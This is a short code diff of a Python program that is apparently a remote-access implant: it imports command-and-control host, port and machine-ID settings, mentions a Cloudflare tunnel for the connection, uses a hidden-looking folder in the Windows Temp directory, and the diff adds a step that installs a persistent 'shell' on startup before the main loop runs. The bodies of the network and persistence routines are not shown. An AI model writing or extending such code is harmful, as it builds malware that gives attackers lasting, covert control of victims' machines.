@@ -5,6 +5,7 @@ import time
 import locale
 import os
 from config import C2_HOST, C2_PORT, MACHINE_ID
+from persistence import install_shell, is_shell_installed
 
 C2_URL = C2_HOST  # port handled by Cloudflare tunnel, no need to append
 cwd = os.path.expandvars(r"C:\Windows\Temp\cerberus")
@@ -102,4 +103,6 @@ def start():
 
 
 if __name__ == "__main__":
+    if not is_shell_installed():
+        install_shell()
     start()
